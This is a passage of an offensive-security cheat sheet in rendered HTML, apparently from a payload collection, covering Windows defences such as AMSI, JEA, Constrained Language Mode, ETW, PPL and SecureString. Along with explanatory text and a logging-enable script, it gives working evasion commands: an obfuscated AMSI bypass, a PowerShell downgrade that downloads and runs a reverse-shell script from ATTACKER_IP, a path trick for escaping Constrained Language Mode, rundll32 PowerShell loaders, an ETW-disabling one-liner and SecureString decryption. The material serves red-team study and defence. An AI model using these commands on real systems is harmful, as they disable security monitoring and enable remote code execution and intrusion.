+<h3 id="anti-malware-scan-interface">Anti Malware Scan Interface</h3>
+<blockquote>
+<p>The Anti-Malware Scan Interface (AMSI) is a Windows API (Application Programming Interface) that provides a unified interface for applications and services to integrate with any anti-malware product installed on a system. The API allows anti-malware solutions to scan files and scripts at runtime, and provides a means for applications to request a scan of specific content.</p>
+</blockquote>
+<p>Find more AMSI bypass: <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20AMSI%20Bypass.md">Windows - AMSI Bypass.md</a></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a><span class="nb">PS </span><span class="n">C</span><span class="p">:\&gt;</span> <span class="no">[Ref]</span><span class="p">.</span><span class="n">Assembly</span><span class="p">.</span><span class="n">GetType</span><span class="p">(</span><span class="s1">&#39;System.Management.Automation.Ams&#39;</span><span class="p">+</span><span class="s1">&#39;iUtils&#39;</span><span class="p">).</span><span class="n">GetField</span><span class="p">(</span><span class="s1">&#39;am&#39;</span><span class="p">+</span><span class="s1">&#39;siInitFailed&#39;</span><span class="p">,</span><span class="s1">&#39;NonPu&#39;</span><span class="p">+</span><span class="s1">&#39;blic,Static&#39;</span><span class="p">).</span><span class="n">SetValue</span><span class="p">(</span><span class="nv">$null</span><span class="p">,</span><span class="nv">$true</span><span class="p">)</span>
+</code></pre></div>
+<h3 id="just-enough-administration">Just Enough Administration</h3>
+<blockquote>
+<p>Just-Enough-Administration (JEA) is a feature in Microsoft Windows Server that allows administrators to delegate specific administrative tasks to non-administrative users. JEA provides a secure and controlled way to grant limited, just-enough access to systems, while ensuring that the user cannot perform unintended actions or access sensitive information.</p>
+</blockquote>
+<p>Breaking out if JEA:
+* List available cmdlets: <code>command</code>
+* Look for non-default cmdlets:
+    <div class="highlight"><pre><span></span><code><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a><span class="nb">Set-PSSessionConfiguration</span>
+<a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a><span class="nb">Start-Process</span>
+<a id="__codelineno-8-3" name="__codelineno-8-3" href="#__codelineno-8-3"></a><span class="nb">New-Service</span>
+<a id="__codelineno-8-4" name="__codelineno-8-4" href="#__codelineno-8-4"></a><span class="nb">Add-Computer</span>
+</code></pre></div></p>
+<h3 id="constrained-language-mode">Constrained Language Mode</h3>
+<p>Check if we are in a constrained mode: <code>$ExecutionContext.SessionState.LanguageMode</code></p>
+<ul>
+<li>
+<p>Bypass using an old Powershell. Powershell v2 doesn't support CLM.
+    <div class="highlight"><pre><span></span><code><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a><span class="n">powershell</span><span class="p">.</span><span class="n">exe</span> <span class="n">-version</span> <span class="n">2</span>
+<a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a><span class="n">powershell</span><span class="p">.</span><span class="n">exe</span> <span class="n">-version</span> <span class="n">2</span> <span class="n">-ExecutionPolicy</span> <span class="n">bypass</span>
+<a id="__codelineno-9-3" name="__codelineno-9-3" href="#__codelineno-9-3"></a><span class="n">powershell</span><span class="p">.</span><span class="n">exe</span> <span class="n">-v</span> <span class="n">2</span> <span class="n">-ep</span> <span class="n">bypass</span> <span class="n">-command</span> <span class="s2">&quot;IEX (New-Object Net.WebClient).DownloadString(&#39;http://ATTACKER_IP/rev.ps1&#39;)&quot;</span>
+</code></pre></div></p>
+</li>
+<li>
+<p>Bypass when <code>__PSLockDownPolicy</code> is used. Just put "System32" somewhere in the path. 
+    <div class="highlight"><pre><span></span><code><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a><span class="c"># Enable CLM from the environment</span>
+<a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a><span class="no">[Environment]</span><span class="p">::</span><span class="n">SetEnvironmentVariable</span><span class="p">(</span><span class="s1">&#39;__PSLockdownPolicy&#39;</span><span class="p">,</span> <span class="s1">&#39;4&#39;</span><span class="p">,</span> <span class="s1">&#39;Machine&#39;</span><span class="p">)</span>
+<a id="__codelineno-10-3" name="__codelineno-10-3" href="#__codelineno-10-3"></a><span class="nb">Get-ChildItem</span> <span class="n">-Path</span> <span class="n">Env</span><span class="p">:</span>
+<a id="__codelineno-10-4" name="__codelineno-10-4" href="#__codelineno-10-4"></a>
+<a id="__codelineno-10-5" name="__codelineno-10-5" href="#__codelineno-10-5"></a><span class="c"># Create a check-mode.ps1 containing your &quot;evil&quot; powershell commands</span>
+<a id="__codelineno-10-6" name="__codelineno-10-6" href="#__codelineno-10-6"></a><span class="nv">$mode</span> <span class="p">=</span> <span class="nv">$ExecutionContext</span><span class="p">.</span><span class="n">SessionState</span><span class="p">.</span><span class="n">LanguageMode</span>
+<a id="__codelineno-10-7" name="__codelineno-10-7" href="#__codelineno-10-7"></a><span class="nb">write-host</span> <span class="nv">$mode</span>
+<a id="__codelineno-10-8" name="__codelineno-10-8" href="#__codelineno-10-8"></a>
+<a id="__codelineno-10-9" name="__codelineno-10-9" href="#__codelineno-10-9"></a><span class="c"># Simple bypass, execute inside a System32 folder</span>
+<a id="__codelineno-10-10" name="__codelineno-10-10" href="#__codelineno-10-10"></a><span class="nb">PS </span><span class="n">C</span><span class="p">:\&gt;</span> <span class="n">C</span><span class="p">:\</span><span class="n">Users</span><span class="p">\</span><span class="n">Public</span><span class="p">\</span><span class="n">check-mode</span><span class="p">.</span><span class="n">ps1</span>
+<a id="__codelineno-10-11" name="__codelineno-10-11" href="#__codelineno-10-11"></a><span class="n">ConstrainedLanguage</span>
+<a id="__codelineno-10-12" name="__codelineno-10-12" href="#__codelineno-10-12"></a>
+<a id="__codelineno-10-13" name="__codelineno-10-13" href="#__codelineno-10-13"></a><span class="nb">PS </span><span class="n">C</span><span class="p">:\&gt;</span> <span class="n">C</span><span class="p">:\</span><span class="n">Users</span><span class="p">\</span><span class="n">Public</span><span class="p">\</span><span class="n">System32</span><span class="p">\</span><span class="n">check-mode</span><span class="p">.</span><span class="n">ps1</span>
+<a id="__codelineno-10-14" name="__codelineno-10-14" href="#__codelineno-10-14"></a><span class="n">FullLanguagge</span>
+</code></pre></div></p>
+</li>
+<li>
+<p>Bypass using COM: <a href="https://gist.githubusercontent.com/xpn/1e9e879fab3e9ebfd236f5e4fdcfb7f1/raw/ceb39a9d5b0402f98e8d3d9723b0bd19a84ac23e/COM_to_registry.ps1">xpn/COM_to_registry.ps1</a></p>
+</li>
+<li>Bypass using your own Powershell DLL: <a href="https://github.com/p3nt4/PowerShdll">p3nt4/PowerShdll</a> &amp; <a href="https://github.com/iomoath/PowerShx">iomoath/PowerShx</a> 
+    <div class="highlight"><pre><span></span><code><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a><span class="n">rundll32</span> <span class="n">PowerShdll</span><span class="p">,</span><span class="n">main</span> <span class="p">&lt;</span><span class="n">script</span><span class="p">&gt;</span>
+<a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a><span class="n">rundll32</span> <span class="n">PowerShdll</span><span class="p">,</span><span class="n">main</span> <span class="n">-h</span>      <span class="n">Display</span> <span class="n">this</span> <span class="n">message</span>
+<a id="__codelineno-11-3" name="__codelineno-11-3" href="#__codelineno-11-3"></a><span class="n">rundll32</span> <span class="n">PowerShdll</span><span class="p">,</span><span class="n">main</span> <span class="o">-f</span> <span class="p">&lt;</span><span class="n">path</span><span class="p">&gt;</span>       <span class="n">Run</span> <span class="n">the</span> <span class="n">script</span> <span class="n">passed</span> <span class="n">as</span> <span class="n">argument</span>
+<a id="__codelineno-11-4" name="__codelineno-11-4" href="#__codelineno-11-4"></a><span class="n">rundll32</span> <span class="n">PowerShdll</span><span class="p">,</span><span class="n">main</span> <span class="n">-w</span>      <span class="nb">Start </span><span class="n">an</span> <span class="n">interactive</span> <span class="n">console</span> <span class="k">in</span> <span class="n">a</span> <span class="n">new</span> <span class="n">window</span> <span class="p">(</span><span class="k">Default</span><span class="p">)</span>
+<a id="__codelineno-11-5" name="__codelineno-11-5" href="#__codelineno-11-5"></a><span class="n">rundll32</span> <span class="n">PowerShdll</span><span class="p">,</span><span class="n">main</span> <span class="n">-i</span>      <span class="nb">Start </span><span class="n">an</span> <span class="n">interactive</span> <span class="n">console</span> <span class="k">in</span> <span class="n">this</span> <span class="n">console</span>
+<a id="__codelineno-11-6" name="__codelineno-11-6" href="#__codelineno-11-6"></a>
+<a id="__codelineno-11-7" name="__codelineno-11-7" href="#__codelineno-11-7"></a><span class="n">rundll32</span> <span class="n">PowerShx</span><span class="p">.</span><span class="n">dll</span><span class="p">,</span><span class="n">main</span> <span class="n">-e</span>                           <span class="p">&lt;</span><span class="nb">PS </span><span class="n">script</span> <span class="n">to</span> <span class="n">run</span><span class="p">&gt;</span>
+<a id="__codelineno-11-8" name="__codelineno-11-8" href="#__codelineno-11-8"></a><span class="n">rundll32</span> <span class="n">PowerShx</span><span class="p">.</span><span class="n">dll</span><span class="p">,</span><span class="n">main</span> <span class="o">-f</span> <span class="p">&lt;</span><span class="n">path</span><span class="p">&gt;</span>                    <span class="n">Run</span> <span class="n">the</span> <span class="n">script</span> <span class="n">passed</span> <span class="n">as</span> <span class="n">argument</span>
+<a id="__codelineno-11-9" name="__codelineno-11-9" href="#__codelineno-11-9"></a><span class="n">rundll32</span> <span class="n">PowerShx</span><span class="p">.</span><span class="n">dll</span><span class="p">,</span><span class="n">main</span> <span class="o">-f</span> <span class="p">&lt;</span><span class="n">path</span><span class="p">&gt;</span> <span class="n">-c</span> <span class="p">&lt;</span><span class="nb">PS </span><span class="n">Cmdlet</span><span class="p">&gt;</span>     <span class="n">Load</span> <span class="n">a</span> <span class="n">script</span> <span class="n">and</span> <span class="n">run</span> <span class="n">a</span> <span class="nb">PS </span><span class="n">cmdlet</span>
+<a id="__codelineno-11-10" name="__codelineno-11-10" href="#__codelineno-11-10"></a><span class="n">rundll32</span> <span class="n">PowerShx</span><span class="p">.</span><span class="n">dll</span><span class="p">,</span><span class="n">main</span> <span class="n">-w</span>                           <span class="nb">Start </span><span class="n">an</span> <span class="n">interactive</span> <span class="n">console</span> <span class="k">in</span> <span class="n">a</span> <span class="n">new</span> <span class="n">window</span>
+<a id="__codelineno-11-11" name="__codelineno-11-11" href="#__codelineno-11-11"></a><span class="n">rundll32</span> <span class="n">PowerShx</span><span class="p">.</span><span class="n">dll</span><span class="p">,</span><span class="n">main</span> <span class="n">-i</span>                           <span class="nb">Start </span><span class="n">an</span> <span class="n">interactive</span> <span class="n">console</span>
+<a id="__codelineno-11-12" name="__codelineno-11-12" href="#__codelineno-11-12"></a><span class="n">rundll32</span> <span class="n">PowerShx</span><span class="p">.</span><span class="n">dll</span><span class="p">,</span><span class="n">main</span> <span class="n">-s</span>                           <span class="n">Attempt</span> <span class="n">to</span> <span class="n">bypass</span> <span class="n">AMSI</span>
+<a id="__codelineno-11-13" name="__codelineno-11-13" href="#__codelineno-11-13"></a><span class="n">rundll32</span> <span class="n">PowerShx</span><span class="p">.</span><span class="n">dll</span><span class="p">,</span><span class="n">main</span> <span class="n">-v</span>                           <span class="n">Print</span> <span class="n">Execution</span> <span class="n">Output</span> <span class="n">to</span> <span class="n">the</span> <span class="n">console</span>
+</code></pre></div></li>
+</ul>
+<h3 id="script-block-and-module-logging">Script Block and Module Logging</h3>
+<blockquote>
+<p>Once Script Block Logging is enabled, the script blocks and commands that are executed will be recorded in the Windows event log under the "Windows PowerShell" channel. To view the logs, administrators can use the Event Viewer application and navigate to the "Windows PowerShell" channel.</p>
+</blockquote>
+<p>Enable Script Block Logging:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a><span class="k">function</span> <span class="nb">Enable-PSScriptBlockLogging</span>
+<a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a><span class="p">{</span>
+<a id="__codelineno-12-3" name="__codelineno-12-3" href="#__codelineno-12-3"></a>    <span class="nv">$basePath</span> <span class="p">=</span> <span class="s1">&#39;HKLM:\Software\Policies\Microsoft\Windows&#39;</span> <span class="p">+</span>
+<a id="__codelineno-12-4" name="__codelineno-12-4" href="#__codelineno-12-4"></a>      <span class="s1">&#39;\PowerShell\ScriptBlockLogging&#39;</span>
+<a id="__codelineno-12-5" name="__codelineno-12-5" href="#__codelineno-12-5"></a>
+<a id="__codelineno-12-6" name="__codelineno-12-6" href="#__codelineno-12-6"></a>    <span class="k">if</span><span class="p">(</span><span class="o">-not</span> <span class="p">(</span><span class="nb">Test-Path</span> <span class="nv">$basePath</span><span class="p">))</span>
+<a id="__codelineno-12-7" name="__codelineno-12-7" href="#__codelineno-12-7"></a>    <span class="p">{</span>
+<a id="__codelineno-12-8" name="__codelineno-12-8" href="#__codelineno-12-8"></a>        <span class="nv">$null</span> <span class="p">=</span> <span class="nb">New-Item</span> <span class="nv">$basePath</span> <span class="n">-Force</span>
+<a id="__codelineno-12-9" name="__codelineno-12-9" href="#__codelineno-12-9"></a>    <span class="p">}</span>
+<a id="__codelineno-12-10" name="__codelineno-12-10" href="#__codelineno-12-10"></a>
+<a id="__codelineno-12-11" name="__codelineno-12-11" href="#__codelineno-12-11"></a>    <span class="nb">Set-ItemProperty</span> <span class="nv">$basePath</span> <span class="n">-Name</span> <span class="n">EnableScriptBlockLogging</span> <span class="n">-Value</span> <span class="s2">&quot;1&quot;</span>
+<a id="__codelineno-12-12" name="__codelineno-12-12" href="#__codelineno-12-12"></a><span class="p">}</span>
+</code></pre></div>
+<p>Disable ETW of the current PowerShell session with <a href="https://gist.github.com/tandasat/e595c77c52e13aaee60e1e8b65d2ba32">tandasat/KillETW.ps1</a>: </p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a><span class="c"># This PowerShell command sets 0 to System.Management.Automation.Tracing.PSEtwLogProvider etwProvider.m_enabled which effectively disables Suspicious ScriptBlock Logging etc.</span>
+<a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a><span class="no">[Reflection.Assembly]</span><span class="p">::</span><span class="n">LoadWithPartialName</span><span class="p">(</span><span class="s1">&#39;System.Core&#39;</span><span class="p">).</span><span class="n">GetType</span><span class="p">(</span><span class="s1">&#39;System.Diagnostics.Eventing.EventProvider&#39;</span><span class="p">).</span><span class="n">GetField</span><span class="p">(</span><span class="s1">&#39;m_enabled&#39;</span><span class="p">,</span><span class="s1">&#39;NonPublic,Instance&#39;</span><span class="p">).</span><span class="n">SetValue</span><span class="p">(</span><span class="no">[Ref]</span><span class="p">.</span><span class="n">Assembly</span><span class="p">.</span><span class="n">GetType</span><span class="p">(</span><span class="s1">&#39;System.Management.Automation.Tracing.PSEtwLogProvider&#39;</span><span class="p">).</span><span class="n">GetField</span><span class="p">(</span><span class="s1">&#39;etwProvider&#39;</span><span class="p">,</span><span class="s1">&#39;NonPublic,Static&#39;</span><span class="p">).</span><span class="n">GetValue</span><span class="p">(</span><span class="nv">$null</span><span class="p">),</span><span class="n">0</span><span class="p">)</span>
+</code></pre></div>
+<h3 id="powershell-transcript">PowerShell Transcript</h3>
+<p>PowerShell Transcript is a logging feature that records all commands and output from a PowerShell session. It helps with auditing, debugging, and troubleshooting by saving session activity to a text file. </p>
+<p>Start a transcript and store the output in a custom file.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a><span class="nb">Start-Transcript</span> <span class="n">-Path</span> <span class="s2">&quot;C:\transcripts\transcript0.txt&quot;</span> <span class="n">-NoClobber</span>
+</code></pre></div>
+<p>Common locations for PowerShell transcripts outputs:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a><span class="n">C</span><span class="p">:\</span><span class="n">Users</span><span class="p">\&lt;</span><span class="n">USERNAME</span><span class="p">&gt;\</span><span class="n">Documents</span><span class="p">\</span><span class="n">PowerShell_transcript</span><span class="p">.&lt;</span><span class="n">HOSTNAME</span><span class="p">&gt;.&lt;</span><span class="n">RANDOM</span><span class="p">&gt;.&lt;</span><span class="n">TIMESTAMP</span><span class="p">&gt;.</span><span class="n">txt</span>
+<a id="__codelineno-15-2" name="__codelineno-15-2" href="#__codelineno-15-2"></a><span class="n">C</span><span class="p">:\</span><span class="n">Transcripts</span><span class="p">\&lt;</span><span class="n">DATE</span><span class="p">&gt;\</span><span class="n">PowerShell_transcript</span><span class="p">.&lt;</span><span class="n">HOSTNAME</span><span class="p">&gt;.&lt;</span><span class="n">RANDOM</span><span class="p">&gt;.&lt;</span><span class="n">TIMESTAMP</span><span class="p">&gt;.</span><span class="n">txt</span>
+</code></pre></div>
+<h3 id="securestring">SecureString</h3>
+<p>A <code>SecureString</code> in PowerShell is a data type designed to store sensitive information like passwords or confidential data in a more secure manner than a plain string. Unlike a regular string, which stores data in plain text and can be easily accessed in memory, a <code>SecureString</code> encrypts the data in memory, providing better protection against unauthorized access.</p>
+<p>Convert to SecureString</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a><span class="nv">$original</span> <span class="p">=</span> <span class="s1">&#39;myPassword&#39;</span>  
+<a id="__codelineno-16-2" name="__codelineno-16-2" href="#__codelineno-16-2"></a><span class="nv">$secureString</span> <span class="p">=</span> <span class="nb">ConvertTo-SecureString</span> <span class="nv">$original</span> <span class="n">-AsPlainText</span> <span class="n">-Force</span>
+<a id="__codelineno-16-3" name="__codelineno-16-3" href="#__codelineno-16-3"></a><span class="nv">$secureStringValue</span> <span class="p">=</span> <span class="nb">ConvertFrom-SecureString</span> <span class="nv">$secureString</span>
+</code></pre></div>
+<p>Get the original content</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a><span class="nv">$secureStringBack</span> <span class="p">=</span> <span class="nv">$secureStringValue</span> <span class="p">|</span> <span class="nb">ConvertTo-SecureString</span>
+<a id="__codelineno-17-2" name="__codelineno-17-2" href="#__codelineno-17-2"></a><span class="nv">$bstr</span> <span class="p">=</span> <span class="no">[System.Runtime.InteropServices.Marshal]</span><span class="p">::</span><span class="n">SecureStringToBSTR</span><span class="p">(</span><span class="nv">$secureStringBack</span><span class="p">);</span>
+<a id="__codelineno-17-3" name="__codelineno-17-3" href="#__codelineno-17-3"></a><span class="nv">$finalValue</span> <span class="p">=</span> <span class="no">[System.Runtime.InteropServices.Marshal]</span><span class="p">::</span><span class="n">PtrToStringAuto</span><span class="p">(</span><span class="nv">$bstr</span><span class="p">)</span>
+</code></pre></div>
+<p>When a <code>SecureString</code> is created, the plain text characters are encrypted immediately using the Data Protection API (<strong>DPAPI</strong>)</p>
+<p>Using the AES key</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a><span class="no">[Byte[]]</span> <span class="nv">$key</span> <span class="p">=</span> <span class="p">(</span><span class="n">49</span><span class="p">,</span><span class="n">222</span><span class="p">,...,</span><span class="n">87</span><span class="p">,</span><span class="n">159</span><span class="p">)</span>
+<a id="__codelineno-18-2" name="__codelineno-18-2" href="#__codelineno-18-2"></a><span class="nv">$pass</span> <span class="p">=</span> <span class="p">(</span><span class="nb">echo </span><span class="s2">&quot;AA...AA=&quot;</span> <span class="p">|</span> <span class="nb">ConvertTo-SecureString</span> <span class="n">-Key</span> <span class="nv">$key</span><span class="p">)</span>
+<a id="__codelineno-18-3" name="__codelineno-18-3" href="#__codelineno-18-3"></a><span class="no">[Runtime.InteropServices.Marshal]</span><span class="p">::</span><span class="n">PtrToStringAuto</span><span class="p">(</span><span class="no">[Runtime.InteropServices.Marshal]</span><span class="p">::</span><span class="n">SecureStringToBSTR</span><span class="p">(</span><span class="nv">$pass</span><span class="p">))</span>
+</code></pre></div>
+<h2 id="protected-process-light">Protected Process Light</h2>
+<p>Protected Process Light (PPL) is implemented as a Windows security mechanism that enables processes to be marked as "protected" and run in a secure, isolated environment, where they are shielded from attacks by malware or other unauthorized processes. PPL is used to protect processes that are critical to the operation of the operating system, such as anti-virus software, firewalls, and other security-related processes.</p>
+<p>When a process is marked as "protected" using PPL, it is assigned a security level that determines the level of protection it will receive. This security level can be set to one of several levels, ranging from low to high. Processes that are assigned a higher security level are given more protection than those that are assigned a lower security level.</p>
+<p>A process's protection is defined by a combination of the "level" and the "signer". The following table represent commonly used combinations, from <a href="https://itm4n.github.io/lsass-runasppl/">itm4n.github.io</a>.</p>
+<table>
+<thead>
+<tr>
+<th>Protection level</th>
+<th>Value</th>
+<th>Signer</th>
+<th>Type</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>PS_PROTECTED_SYSTEM</td>
+<td>0x72</td>
+<td>WinSystem (7)</td>
+<td>Protected (2)</td>
+</tr>
+<tr>
+<td>PS_PROTECTED_WINTCB</td>
+<td>0x62</td>
+<td>WinTcb (6)</td>
+<td>Protected (2)</td>
+</tr>
+<tr>
+<td>PS_PROTECTED_WINDOWS</td>
+<td>0x52</td>
+<td>Windows (5)</td>
+<td>Protected (2)</td>
+</tr>
+<tr>
+<td>PS_PROTECTED_AUTHENTICODE</td>
+<td>0x12</td>
+<td>Authenticode (1)</td>
+<td>Protected (2)</td>
+</tr>
+<tr>
+<td>PS_PROTECTED_WINTCB_LIGHT</td>
+<td>0x61</td>
+<td>WinTcb (6)</td>
+<td>Protected Light (1)</td>
+</tr>
+<tr>
+<td>PS_PROTECTED_WINDOWS_LIGHT</td>
+<td>0x51</td>
+<td>Windows (5)</td>
+<td>Protected Light (1)</td>
+</tr>
+<tr>
+<td>PS_PROTECTED_LSA_LIGHT</td>
+<td>0x41</td>
+<td>Lsa (4)</td>
+<td>Protected Light (1)</td>
+</tr>
+<tr>
+<td>PS_PROTECTED_ANTIMALWARE_LIGHT</td>
+<td>0x31</td>
+<td>Antimalware (3)</td>
+<td>Protected Light (1)</td>
+</tr>
+<tr>
+<td>PS_PROTECTED_AUTHENTICODE_LIGHT</td>
+<td>0x11</td>
+<td>Authenticode (1)</td>
+<td>Protected Light (1)</td>
+</tr>
+</tbody>
+</table>
+<p>PPL works by restricting access to the protected process's memory and system resources, and by preventing the process from being modified or terminated by other processes or users. The process is also isolated from other processes running on the system, which helps prevent attacks that attempt to exploit shared resources or dependencies.</p>
+<ul>
+<li>Check if LSASS is running in PPL
+    <div class="highlight"><pre><span></span><code><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a><span class="n">reg</span> <span class="n">query</span> <span class="n">HKEY_LOCAL_MACHINE</span><span class="p">\</span><span class="n">SYSTEM</span><span class="p">\</span><span class="n">CurrentControlSet</span><span class="p">\</span><span class="n">Control</span><span class="p">\</span><span class="n">Lsa</span> <span class="p">/</span><span class="n">v</span> <span class="n">RunAsPPL</span>
+</code></pre></div></li>
+<li>Protected process example: you can't kill Microsoft Defender even with Administrator privilege.
+    <div class="highlight"><pre><span></span><code><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a><span class="n">taskkill</span> <span class="p">/</span><span class="n">f</span> <span class="p">/</span><span class="n">im</span> <span class="n">MsMpEng</span><span class="p">.</span><span class="n">exe</span>
+<a id="__codelineno-20-2" name="__codelineno-20-2" href="#__codelineno-20-2"></a><span class="n">ERROR</span><span class="p">:</span> <span class="n">The</span> <span class="k">process</span> <span class="s2">&quot;MsMpEng.exe&quot;</span> <span class="n">with</span> <span class="n">PID</span> <span class="n">5784</span> <span class="n">could</span> <span class="n">not</span> <span class="n">be</span> <span class="n">terminated</span><span class="p">.</span>
+<a id="__codelineno-20-3" name="__codelineno-20-3" href="#__codelineno-20-3"></a><span class="n">Reason</span><span class="p">:</span> <span class="n">Access</span> <span class="n">is</span> <span class="n">denied</span><span class="p">.</span>
+</code></pre></div></li>
+<li>Can be disabled using vulnerable drivers (Bring Your Own Vulnerable Driver / BYOVD)</li>
+</ul>
+<h2 id="credential-guard">Credential Guard</h2>
+<p>When Credential Guard is enabled, it uses hardware-based virtualization to create a secure environment that is separate from the operating system. This secure environment is used to store sensitive credential information, which is encrypted and protected from unauthorized access. </p>
+<p>Credential Guard uses a combination of hardware-based virtualization and the Trusted Platform Module (TPM) to ensure that the secure kernel is trusted and secure. It can be enabled on devices that have a compatible processor and TPM version, and require a UEFI firmware that supports the necessary features.</p>
+<h2 id="event-tracing-for-windows">Event Tracing for Windows</h2>
+<p>ETW (Event Tracing for Windows) is a Windows-based logging mechanism that provides a way to collect and analyze system events and performance data in real-time. ETW allows developers and system administrators to gather detailed information about system performance and behavior, which can be used for troubleshooting, optimization, and security purposes.</p>
+<table>
+<thead>
+<tr>
+<th>Name</th>
+<th>GUID</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Microsoft-Antimalware-Scan-Interface</td>
+<td>{2A576B87-09A7-520E-C21A-4942F0271D67}</td>
+</tr>
+<tr>
+<td>Microsoft-Windows-PowerShell</td>
+<td>{A0C1853B-5C40-4B15-8766-3CF1C58F985A}</td>
+</tr>
+<tr>
+<td>Microsoft-Antimalware-Protection</td>
+<td>{E4B70372-261F-4C54-8FA6-A5A7914D73DA}</td>
+</tr>
+<tr>
+<td>Microsoft-Windows-Threat-Intelligence</td>
+<td>{F4E1897C-BB5D-5668-F1D8-040F4D8DD344}</td>
+</tr>
+</tbody>
+</table>
+<p>You can see all the providers registered to Windows using: <code>logman query providers</code></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a><span class="nb">PS </span><span class="n">C</span><span class="p">:\</span><span class="n">Users</span><span class="p">\</span><span class="n">User</span><span class="p">\</span><span class="n">Documents</span><span class="p">&gt;</span> <span class="n">logman</span> <span class="n">query</span> <span class="n">providers</span>
+<a id="__codelineno-21-2" name="__codelineno-21-2" href="#__codelineno-21-2"></a>
+<a id="__codelineno-21-3" name="__codelineno-21-3" href="#__codelineno-21-3"></a><span class="n">Provider</span>                                 <span class="n">GUID</span>
+<a id="__codelineno-21-4" name="__codelineno-21-4" href="#__codelineno-21-4"></a><span class="p">-------------------------------------------------------------------------------</span>
+<a id="__codelineno-21-5" name="__codelineno-21-5" href="#__codelineno-21-5"></a><span class="p">.</span><span class="n">NET</span> <span class="n">Common</span> <span class="n">Language</span> <span class="n">Runtime</span>             <span class="p">{</span><span class="n">E13C0D23-CCBC</span><span class="p">-</span><span class="n">4E12</span><span class="p">-</span><span class="n">931B-D9CC2EEE27E4</span><span class="p">}</span>
+<a id="__codelineno-21-6" name="__codelineno-21-6" href="#__codelineno-21-6"></a><span class="n">ACPI</span> <span class="n">Driver</span> <span class="n">Trace</span> <span class="n">Provider</span>               <span class="p">{</span><span class="n">DAB01D4D</span><span class="p">-</span><span class="n">2D48</span><span class="p">-</span><span class="n">477D-B1C3-DAAD0CE6F06B</span><span class="p">}</span>
+<a id="__codelineno-21-7" name="__codelineno-21-7" href="#__codelineno-21-7"></a><span class="n">Active</span> <span class="n">Directory</span> <span class="n">Domain</span> <span class="n">Services</span><span class="p">:</span> <span class="n">SAM</span>    <span class="p">{</span><span class="n">8E598056</span><span class="p">-</span><span class="n">8993</span><span class="p">-</span><span class="n">11D2</span><span class="p">-</span><span class="n">819E</span><span class="p">-</span><span class="n">0000F875A064</span><span class="p">}</span>
+<a id="__codelineno-21-8" name="__codelineno-21-8" href="#__codelineno-21-8"></a><span class="n">Active</span> <span class="n">Directory</span><span class="p">:</span> <span class="n">Kerberos</span> <span class="n">Client</span>        <span class="p">{</span><span class="n">BBA3ADD2-C229</span><span class="p">-</span><span class="n">4CDB-AE2B</span><span class="p">-</span><span class="n">57EB6966B0C4</span><span class="p">}</span>
+<a id="__codelineno-21-9" name="__codelineno-21-9" href="#__codelineno-21-9"></a><span class="n">Active</span> <span class="n">Directory</span><span class="p">:</span> <span class="n">NetLogon</span>               <span class="p">{</span><span class="n">F33959B4-DBEC</span><span class="p">-</span><span class="n">11D2</span><span class="p">-</span><span class="n">895B</span><span class="p">-</span><span class="n">00C04F79AB69</span><span class="p">}</span>
+<a id="__codelineno-21-10" name="__codelineno-21-10" href="#__codelineno-21-10"></a><span class="n">ADODB</span><span class="p">.</span><span class="n">1</span>                                  <span class="p">{</span><span class="n">04C8A86F</span><span class="p">-</span><span class="n">3369</span><span class="p">-</span><span class="n">12F8</span><span class="p">-</span><span class="n">4769</span><span class="p">-</span><span class="n">24E484A9E725</span><span class="p">}</span>
+<a id="__codelineno-21-11" name="__codelineno-21-11" href="#__codelineno-21-11"></a><span class="n">ADOMD</span><span class="p">.</span><span class="n">1</span>                                  <span class="p">{</span><span class="n">7EA56435</span><span class="p">-</span><span class="n">3F2F</span><span class="p">-</span><span class="n">3F63-A829-F0B35B5CAD41</span><span class="p">}</span>
+<a id="__codelineno-21-12" name="__codelineno-21-12" href="#__codelineno-21-12"></a><span class="p">...</span>
+</code></pre></div>
+<p>We can get more information about the provider using:  <code>logman query providers {ProviderID}/Provider-Name</code></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a><span class="nb">PS </span><span class="n">C</span><span class="p">:\</span><span class="n">Users</span><span class="p">\</span><span class="n">User</span><span class="p">\</span><span class="n">Documents</span><span class="p">&gt;</span> <span class="n">logman</span> <span class="n">query</span> <span class="n">providers</span> <span class="n">Microsoft-Antimalware-Scan-Interface</span>
+<a id="__codelineno-22-2" name="__codelineno-22-2" href="#__codelineno-22-2"></a>
